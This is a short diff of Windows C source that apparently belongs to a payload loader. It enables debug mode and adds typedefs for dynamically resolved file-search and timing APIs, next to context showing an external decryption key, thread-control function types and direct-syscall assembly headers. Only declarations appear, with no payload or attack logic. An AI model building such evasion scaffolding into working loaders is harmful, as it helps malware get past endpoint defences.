@@ -4,7 +4,7 @@
 #include <windows.h>
 #include <stdbool.h>
 
-#define DEBUG false
+#define DEBUG true
 #define ARRAY_SIZE 1000
 extern unsigned char DECKEY;
 
@@ -36,6 +36,11 @@ typedef BOOL(WINAPI *pTerminateThread_t)(HANDLE, DWORD);
 typedef BOOL(WINAPI *pReadFile_t)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL(WINAPI *pCloseHandle_t)(HANDLE);
 typedef BOOL(WINAPI *pResumeThread_t)(HANDLE);
+typedef PCSTR(WINAPI *pStrStrIA_t)(PCSTR, PCSTR); //StrStrIA from shlwapi.dll
+typedef BOOL(WINAPI *pFindNextFileA_t)(HANDLE, LPWIN32_FIND_DATAA); // FindNextFileA in fileapi.h, loaded in kernel32.dll
+typedef BOOL(WINAPI *pFindClose_t)(HANDLE); // FindClose in fileapi.h, loaded in kernel32.dll
+typedef HANDLE(WINAPI *pFindFirstFileA_t)(LPCSTR, LPWIN32_FIND_DATAA); // FindFirstFileA in fileapi.h, loaded in kernel32.dll
+typedef BOOL(WINAPI *pQueryPerformance_t)(LARGE_INTEGER*); //for QueryPerformanceFrequency and QueryPerformanceCounter
 
 /*
 Headers of assembly functions for direct syscalls.
